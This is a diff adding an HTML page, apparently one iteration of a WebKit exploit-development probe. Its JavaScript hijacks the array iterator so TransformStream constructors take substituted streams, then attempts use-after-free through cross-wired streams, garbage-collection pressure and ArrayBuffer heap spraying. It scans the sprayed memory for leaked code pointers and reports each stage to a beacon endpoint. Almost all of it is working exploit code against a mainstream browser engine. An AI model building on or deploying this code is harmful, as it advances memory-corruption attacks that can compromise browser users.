@@ -1,0 +1,363 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1145v6</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1145v6: DESYNC UAF + STATE CONFUSION ===');
+log('info','v5 showed: pass-1 sub works (isFake=true), cross-wire works (same_r=true)');
+log('info','Goal: exploit desynchronization between JS API and internal pipe');
+B('P1145V6-START','t='+Date.now());
+
+var origIter=Array.prototype[Symbol.iterator];
+
+// ===== SECTION A: Write to writable of pass-1-substituted TS =====
+log('phase','--- A: Does internal transform pipe still fire? ---');
+var transformCalls=0;
+var passA=0;
+
+// Create a RS that we fully control
+var pullResolve=null;
+var controlledRS=new ReadableStream({
+  pull:function(ctrl){
+    // We control when data appears
+    return new Promise(function(resolve){pullResolve=resolve;});
+  },
+  cancel:function(reason){
+    log('win','Controlled RS cancel: '+reason);
+    B('P1145V6-RS-CANCEL','reason='+reason);
+  }
+});
+
+Array.prototype[Symbol.iterator]=function(){
+  passA++;
+  if(passA===1 && this.length===2){
+    return [controlledRS, this[1]][Symbol.iterator]();
+  }
+  return origIter.call(this);
+};
+
+var tsA=null;
+try{
+  passA=0;
+  tsA=new TransformStream({
+    transform:function(chunk,ctrl){
+      transformCalls++;
+      log('info','Transform called: chunk='+chunk+' (call #'+transformCalls+')');
+      B('P1145V6-TRANSFORM','chunk='+chunk+'|n='+transformCalls);
+      ctrl.enqueue(chunk+'_TRANSFORMED');
+    },
+    flush:function(ctrl){
+      log('info','Flush called!');
+      B('P1145V6-FLUSH','called');
+    }
+  });
+  log('ok','Pass-1 sub TS created');
+  log('info','ts.readable === controlledRS: '+(tsA.readable===controlledRS));
+}catch(e){log('fail','Error: '+e.message);}
+Array.prototype[Symbol.iterator]=origIter;
+
+if(tsA){
+  // Write to ts.writable — does the transform function get called?
+  // ts.readable is OUR RS, but ts.writable is the REAL WS (from pass 1 slot 1)
+  // The internal pipe should still connect writable → transform → internal_RS
+  // But ts.readable is NOT internal_RS, it's our controlledRS
+  try{
+    var wA=tsA.writable.getWriter();
+    wA.write('PAYLOAD_A');
+    wA.write('PAYLOAD_B');
+
+    // Read from OUR readable
+    var rA=tsA.readable.getReader();
+    rA.read().then(function(res){
+      log('ok','Our RS read: '+(res.done?'done':res.value));
+      B('P1145V6-A-OURREAD',res.done?'done':'val='+res.value);
+    });
+
+    // Check: was transform called?
+    setTimeout(function(){
+      log('info','Transform calls after write: '+transformCalls);
+      B('P1145V6-A-TRANSFORMS','n='+transformCalls);
+
+      if(transformCalls>0){
+        log('win','Transform DID fire despite RS substitution!');
+        log('info','Data goes: writable -> transform -> INTERNAL_RS (orphaned)');
+        log('info','Our controlledRS is separate - DESYNC confirmed!');
+      }else{
+        log('info','Transform did NOT fire - pipe may be disconnected');
+      }
+      doSectionB();
+    },200);
+  }catch(e){log('fail','Write: '+e.message);doSectionB();}
+}else{doSectionB();}
+
+function doSectionB(){
+  // ===== SECTION B: Locked RS substitution =====
+  log('phase','--- B: Substitute already-locked RS ---');
+  var passB=0;
+
+  // Create RS and immediately lock it
+  var lockedRS=new ReadableStream({start:function(c){c.enqueue('X');c.close();}});
+  var lockedReader=lockedRS.getReader(); // Now it's locked!
+
+  Array.prototype[Symbol.iterator]=function(){
+    passB++;
+    if(passB===1 && this.length===2){
+      return [lockedRS, this[1]][Symbol.iterator]();
+    }
+    return origIter.call(this);
+  };
+
+  var bResult='?';
+  try{
+    passB=0;
+    var tsB=new TransformStream();
+    bResult='OK:locked='+tsB.readable.locked;
+    log('ok','Locked RS accepted! readable.locked='+tsB.readable.locked);
+
+    // Try to get ANOTHER reader on the locked stream
+    try{
+      var rB2=tsB.readable.getReader();
+      bResult+='|reader2=OK';
+      log('win','Got second reader on locked RS!');
+    }catch(e){
+      bResult+='|reader2=ERR:'+e.message.substring(0,30);
+      log('info','Second reader: '+e.message);
+    }
+
+    // Write to writable
+    try{
+      var wB=tsB.writable.getWriter();
+      wB.write('LOCKED_WRITE').then(function(){
+        log('ok','Write to locked-RS TS succeeded');
+        B('P1145V6-B-WRITE','ok');
+      },function(e){
+        log('fail','Write rejected: '+e);
+        B('P1145V6-B-WRITE','err='+e);
+      });
+    }catch(e){log('fail','Writer: '+e.message);}
+  }catch(e){
+    bResult='ERR:'+e.message.substring(0,40);
+    log('fail','Locked RS: '+bResult);
+  }
+  B('P1145V6-B-LOCKED',bResult);
+  Array.prototype[Symbol.iterator]=origIter;
+
+  doSectionC();
+}
+
+function doSectionC(){
+  // ===== SECTION C: Errored RS substitution =====
+  log('phase','--- C: Substitute errored RS ---');
+  var passC=0;
+
+  var erroredRS=new ReadableStream({start:function(c){c.error(new Error('POISONED'));}});
+
+  Array.prototype[Symbol.iterator]=function(){
+    passC++;
+    if(passC===1 && this.length===2){
+      return [erroredRS, this[1]][Symbol.iterator]();
+    }
+    return origIter.call(this);
+  };
+
+  var cResult='?';
+  try{
+    passC=0;
+    var tsC=new TransformStream();
+    cResult='OK';
+    log('ok','Errored RS accepted!');
+
+    // Write to writable of a TS with errored readable
+    try{
+      var wC=tsC.writable.getWriter();
+      wC.write('ERROR_WRITE').then(function(){
+        log('ok','Write to errored-RS TS succeeded');
+        B('P1145V6-C-WRITE','ok');
+      },function(e){
+        log('info','Write to errored-RS TS rejected: '+String(e).substring(0,40));
+        B('P1145V6-C-WRITE','err='+String(e).substring(0,60));
+      });
+    }catch(e){log('fail','Writer: '+e.message);}
+
+    // Try to read
+    try{
+      var rC=tsC.readable.getReader();
+      rC.read().then(function(res){
+        log('info','Read from errored RS: '+(res.done?'done':res.value));
+        B('P1145V6-C-READ','val='+(res.done?'done':res.value));
+      },function(e){
+        log('info','Read rejected (expected): '+String(e).substring(0,40));
+        B('P1145V6-C-READ-ERR',String(e).substring(0,60));
+      });
+    }catch(e){log('fail','Reader: '+e.message);}
+  }catch(e){
+    cResult='ERR:'+e.message.substring(0,40);
+    log('fail','Errored RS: '+cResult);
+  }
+  B('P1145V6-C-ERRORED',cResult);
+  Array.prototype[Symbol.iterator]=origIter;
+
+  doSectionD();
+}
+
+function doSectionD(){
+  // ===== SECTION D: Cross-wire + GC pressure =====
+  log('phase','--- D: Cross-wire + destroy + GC =====');
+
+  // Step 1: Create TS1, capture pass-1 streams
+  var pass1Streams=null;
+  var passD=0;
+  Array.prototype[Symbol.iterator]=function(){
+    passD++;
+    if(passD===1 && this.length===2) pass1Streams=[this[0],this[1]];
+    return origIter.call(this);
+  };
+  var tsD1=new TransformStream({transform:function(c,ctrl){ctrl.enqueue(c);}});
+  Array.prototype[Symbol.iterator]=origIter;
+
+  // Step 2: Create 20 cross-wired TS objects
+  var crossWired=[];
+  for(var i=0;i<20;i++){
+    passD=0;
+    Array.prototype[Symbol.iterator]=function(){
+      passD++;
+      if(passD===1 && this.length===2){
+        return pass1Streams[Symbol.iterator]();
+      }
+      return origIter.call(this);
+    };
+    try{
+      passD=0;
+      crossWired.push(new TransformStream());
+    }catch(e){}
+    Array.prototype[Symbol.iterator]=origIter;
+  }
+  log('ok','Created '+crossWired.length+' cross-wired TS objects');
+  B('P1145V6-D-CROSS','n='+crossWired.length);
+
+  // Step 3: Null out cross-wired TS objects → their zombie internal streams should become collectible
+  crossWired=null;
+
+  // Step 4: Heavy GC pressure
+  log('info','GC pressure...');
+  for(var round=0;round<10;round++){
+    var junk=[];
+    for(var j=0;j<50000;j++) junk.push({x:j,y:new ArrayBuffer(16)});
+    junk=null;
+  }
+  log('info','GC pressure done');
+
+  // Step 5: Now spray ArrayBuffers at various sizes to try to reclaim freed internal stream objects
+  // WebKit internal ReadableStream/WritableStream objects are likely IsoHeap'd
+  // But their internal buffers might be in general bmalloc!
+  var spray=[];
+  var sizes=[32,48,64,96,128,192,256,384];
+  for(var si=0;si<sizes.length;si++){
+    for(var k=0;k<30;k++) spray.push(new ArrayBuffer(sizes[si]));
+  }
+
+  // Step 6: Check if TS1 still works normally
+  var d1OK=false;
+  try{
+    var wD=tsD1.writable.getWriter();
+    wD.write('AFTER_GC');
+    wD.close();
+    var rD=tsD1.readable.getReader();
+    rD.read().then(function(res){
+      d1OK=!res.done;
+      log(d1OK?'ok':'fail','TS1 after GC: '+(res.done?'done':res.value));
+      B('P1145V6-D-AFTERGC','val='+(res.done?'done':res.value));
+
+      // Scan spray buffers for non-zero content (freed stream objects?)
+      var hitCount=0;
+      var codePtr=0;
+      for(var k=0;k<spray.length;k++){
+        var v=new BigUint64Array(spray[k]);
+        for(var q=0;q<v.length;q++){
+          if(v[q]!==0n){
+            hitCount++;
+            var hi=Number(v[q]>>32n);
+            if(hi>=0x5300 && hi<=0x53FF) codePtr++;
+            break;
+          }
+        }
+      }
+      log('info','Spray hits: '+hitCount+' code ptrs: '+codePtr);
+      B('P1145V6-D-SPRAY','hits='+hitCount+'|code='+codePtr);
+
+      if(codePtr>0) log('win','!!! CODE POINTERS IN SPRAY !!!');
+      doSectionE();
+    });
+  }catch(e){log('fail','TS1 use: '+e.message);doSectionE();}
+}
+
+function doSectionE(){
+  // ===== SECTION E: Closed RS + write race =====
+  log('phase','--- E: Closed RS + writable race ---');
+  var passE=0;
+
+  var closedRS=new ReadableStream({start:function(c){c.close();}});
+
+  Array.prototype[Symbol.iterator]=function(){
+    passE++;
+    if(passE===1 && this.length===2){
+      return [closedRS, this[1]][Symbol.iterator]();
+    }
+    return origIter.call(this);
+  };
+
+  try{
+    passE=0;
+    var tsE=new TransformStream();
+    Array.prototype[Symbol.iterator]=origIter;
+    log('ok','Closed RS TS created');
+
+    // Rapidly write to writable — internal pipe expects to push to internal RS,
+    // but the JS-visible RS is already closed. Race condition?
+    var writeResults=[];
+    var wE=tsE.writable.getWriter();
+    for(var i=0;i<10;i++){
+      (function(idx){
+        wE.write('RACE_'+idx).then(function(){
+          writeResults.push('ok_'+idx);
+        },function(e){
+          writeResults.push('err_'+idx+':'+String(e).substring(0,20));
+        });
+      })(i);
+    }
+
+    setTimeout(function(){
+      log('info','Write results: '+writeResults.join(', '));
+      B('P1145V6-E-RACE','results='+writeResults.join(','));
+
+      // Check if writable errored
+      try{
+        wE.close().then(function(){
+          log('ok','Close OK');
+          B('P1145V6-E-CLOSE','ok');
+        },function(e){
+          log('info','Close error: '+e);
+          B('P1145V6-E-CLOSE','err='+String(e).substring(0,40));
+        });
+      }catch(e){log('fail','Close: '+e.message);}
+
+      doFinal();
+    },300);
+  }catch(e){
+    Array.prototype[Symbol.iterator]=origIter;
+    log('fail','Closed RS: '+e.message);
+    B('P1145V6-E-ERR',e.message.substring(0,60));
+    doFinal();
+  }
+}
+
+function doFinal(){
+  setTimeout(function(){
+    B('P1145V6-DONE','transforms='+transformCalls);
+    log('phase','=== P1145v6 COMPLETE ===');
+  },500);
+}
+</script></body></html>
